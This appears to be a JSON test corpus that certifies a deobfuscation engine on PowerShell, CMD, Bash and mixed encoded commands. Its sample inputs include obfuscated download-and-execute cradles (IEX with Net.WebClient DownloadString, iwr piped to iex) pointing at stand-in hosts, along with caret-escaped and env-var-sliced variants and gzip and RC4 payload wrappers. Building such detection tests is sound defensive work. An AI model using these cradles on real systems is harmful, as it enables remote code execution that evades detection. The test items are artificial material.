{
  "corpus_version": "1.3.0",
  "description": "Deterministic Decode Certification Corpus. Reorganized categorically (PowerShell / CMD / Bash / Mixed) to align with the Transformation Coverage Matrix and enable per-category certification metrics. Every sample is deterministic — no time, no randomness, no network. S001 remains the owner's permanent regression anchor.",
  "schema": {
    "version": "c+",
    "notes": "Nested categories with metadata. Consumers must not depend on this layout — access the corpus exclusively via workspace_recovery.corpus_loader.load_samples()."
  },
  "categories": {
    "powershell": {
      "description": "PowerShell-specific deterministic transformations (EncodedCommand, aliases, env-var slicing, join-fold, gzip, unicode).",
      "samples": [
        {
          "id": "S001_ps_writehost_tweet",
          "family": "PowerShell -EncodedCommand (owner anchor · permanent)",
          "input": "powershell.exe -encod VwByAGkAdABlAC0ASABvAHMAdAAgACIAdAB3AGUAZQB0ACwAIAB0AHcAZQBlAHQAIQAiAA==",
          "expected": {
            "interpreter": "powershell",
            "decoder_chain": ["extract-b64", "utf16le-decode"],
            "final_output_contains": ["Write-Host", "tweet, tweet!"],
            "regression_note": "Owner permanent anchor. Baseline v1.5.6 must produce Write-Host \"tweet, tweet!\". Any drift here is an immediate FAIL and blocks any deploy."
          }
        },
        {
          "id": "S01_ps_b64_utf16le",
          "family": "Multi-layer PowerShell Base64 (UTF-16LE)",
          "input": "powershell -EncodedCommand SQBFAFgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAHMAdABhAGcAZQAxACcAKQA=",
          "expected": {
            "interpreter": "powershell",
            "decoder_chain": ["base64", "utf-16le-decode"],
            "stage_order": ["ingest", "interpreter-detect", "extract-encoded-arg", "base64-decode", "utf16le-decode", "final-render"],
            "final_output_contains": ["IEX", "new-object", "net.webclient", ".downloadstring", "http://example.com/stage1"],
            "iocs_contains": ["http://example.com/stage1"]
          }
        },
        {
          "id": "S04_ps_alias_heavy",
          "family": "PowerShell alias-heavy pipeline",
          "input": "$a='ht'+'tp'+'://ex'+'ample.com/x'; iwr $a -useb | iex",
          "expected": {
            "interpreter": "powershell",
            "decoder_chain": ["string-concat-fold", "alias-expand"],
            "final_output_contains": ["invoke-webrequest", "http://example.com/x", "invoke-expression"],
            "iocs_contains": ["http://example.com/x"]
          }
        },
        {
          "id": "S05_nested_b64_gzip",
          "family": "Nested Base64 + GZIP",
          "input": "powershell -c \"$b=[Convert]::FromBase64String('H4sIAAAAAAAAA0vOzy1ILCpJLVJIzs8tKC0uKS0oyE3NLc1LTk0BAJdD/S8ZAAAA'); $ms=New-Object IO.MemoryStream(,$b); $gz=New-Object IO.Compression.GzipStream($ms,[IO.Compression.CompressionMode]::Decompress); $sr=New-Object IO.StreamReader($gz); IEX $sr.ReadToEnd()\"",
          "expected": {
            "interpreter": "powershell",
            "decoder_chain": ["base64", "gzip"],
            "final_output_contains": ["Hello", "hello", "malicious"],
            "verdict_must_be_in": ["Suspicious", "Malicious"]
          }
        },
        {
          "id": "S08_unicode_obfuscation",
          "family": "Unicode / UTF obfuscation",
          "input": "\u0070\u006f\u0077\u0065\u0072\u0073\u0068\u0065\u006c\u006c -c \u0022IEX(New-Object Net.WebClient).DownloadString('http://ex.com/a')\u0022",
          "expected": {
            "interpreter": "powershell",
            "decoder_chain": ["unicode-normalize"],
            "final_output_contains": ["IEX", "http://ex.com/a"],
            "iocs_contains": ["http://ex.com/a"]
          }
        },
        {
          "id": "S012_plaintext_anchor",
          "family": "Already-canonical PowerShell (idempotency anchor)",
          "input": "Write-Host \"tweet, tweet!\"",
          "expected": {
            "interpreter": "powershell",
            "decoder_chain": [],
            "final_output_equals": "Write-Host \"tweet, tweet!\"",
            "convergence": {
              "iterations": 1,
              "structural_changes": 0,
              "content_changes": 0,
              "decoder_changes": 0,
              "semantic_changes": 0,
              "canonical_state": true
            },
            "purpose": "Proves already-canonical PS is not modified · no normalizer replaces valid content · no alias pass overwrites richer output · zero deterministic transforms remain."
          }
        },
        {
          "id": "S013_env_slice_join_reconstruction",
          "family": "Environment variable slicing + Join folding + Semantic reconstruction (no decoder transformations)",
          "input": "& ( $enV:CoMsPeC-jOiN'') ( ( [sTrInG]::JoIn( '', ( $enV:pAtH[4..6] + $EnV:pUbLiC[12] + $EnV:pRoGrAmFiLeS[9] + $enV:CoMsPeC[4,15,25] ) ) -jOiN '' ) + \" -cOmmAnD IEX (New-Object Net.WebClient).DownloadString('http://slicetest.local')\" )",
          "expected": {
            "interpreter": "powershell",
            "decoder_chain": [],
            "structural_pass_must_resolve": ["join()", "nested-joins", "parentheses", "operator-folding"],
            "content_pass_must_resolve": ["mixed-case", "env-var-substitution", "array-slicing", "string-joins", "whitespace-normalize"],
            "decoder_pass_result": "no decoder transformations required",
            "semantic_pass_must_reconstruct": ["psh", "powershell", "-command", "IEX", "New-Object", "DownloadString(...)"],
            "final_output_semantically_equivalent_to": "powershell -Command IEX (New-Object Net.WebClient).DownloadString('http://slicetest.local')",
            "final_output_must_not_be": [
              "(ps-alias-normalize · no aliases)",
              "$env:ComSpec[4,15,25]",
              "[string]::Join(...)",
              "& (...)"
            ],
            "iocs_contains": ["http://slicetest.local"],
            "purpose": "Verifies the Convergence Engine can perform Structure → Content → Semantic reconstruction → Canonical command without relying on decoder plugins."
          }
        }
      ]
    },
    "cmd": {
      "description": "Windows CMD transformations (caret escaping, variable expansion, cmd→powershell handoff).",
      "samples": [
        {
          "id": "S03_cmd_caret_escaped",
          "family": "CMD ^-escaped",
          "input": "c^m^d /c p^ow^ers^he^ll -e^nc SQBFAFgAKAAnAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAJwApAA==",
          "expected": {
            "interpreter": "cmd",
            "decoder_chain": ["cmd-caret-strip", "powershell-encoded-arg", "base64", "utf-16le-decode"],
            "final_output_contains": ["IEX", "net.webclient"]
          }
        }
      ]
    },
    "bash": {
      "description": "Linux/Bash transformations (pipe chains, xxd, base64, rev, openssl, interpreter-routing guards).",
      "samples": [
        {
          "id": "S02_bash_xxd_b64_rev",
          "family": "Bash → xxd → Base64 → rev",
          "input": "echo 'MzAyZTMwMmUzMTJlMzEyMDIwMjMyMDcwNmY3NzY1NzI3MzY4NjU2YzZjIGNvbW1lbnQ=' | rev | base64 -d | xxd -r -p",
          "expected": {
            "interpreter": "bash",
            "decoder_chain": ["rev", "base64", "hex-xxd"],
            "final_output_contains": ["30.30.31.1"],
            "must_not_route_to": "powershell"
          }
        },
        {
          "id": "S07_rc4_openssl",
          "family": "Crypto-wrapped payload (RC4/OpenSSL-style)",
          "input": "openssl enc -rc4 -K 6b6579 -in - <<< 'U2FsdGVkX1+abcdef012345/RC4WrappedPayload=='",
          "expected": {
            "interpreter": "bash",
            "decoder_chain": ["openssl-invocation-parse", "rc4"],
            "must_flag": ["crypto-wrapped"]
          }
        },
        {
          "id": "S10_bash_with_powershell_comment",
          "family": "Bash with literal token 'powershell' inside a comment (interpreter-routing regression guard)",
          "input": "echo 'hello world'  # note: this is not powershell",
          "expected": {
            "interpreter": "bash",
            "decoder_chain": [],
            "final_output_contains": ["hello world"],
            "must_not_route_to": "powershell",
            "regression_note": "Historic design flaw: \\bpowershell\\b regex misroutes this to PowerShell. Recovery must not reintroduce this behavior."
          }
        }
      ]
    },
    "mixed": {
      "description": "Multi-interpreter, interpreter-agnostic, and nested obfuscation payloads (XOR bytes, hex→b64→gzip chains).",
      "samples": [
        {
          "id": "S06_xor_obfuscated",
          "family": "XOR-obfuscated payload",
          "input": "0x1e,0x2d,0x3c,0x4b,0x5a,0x69,0x78,0x87 xor 0x5a",
          "expected": {
            "interpreter": null,
            "decoder_chain": ["byte-array-parse", "xor"],
            "final_output_shape": "bytes_or_ascii"
          }
        },
        {
          "id": "S09_hex_b64_gzip_chain",
          "family": "Mixed chain: Hex → Base64 → GZIP",
          "input": "48344b4141414141414141416b7643377a4c4c797a4b6e50",
          "expected": {
            "interpreter": null,
            "decoder_chain": ["hex", "base64", "gzip"],
            "stage_order_starts_with": ["hex-decode", "base64-decode"]
          }
        }
      ]
    }
  }
}
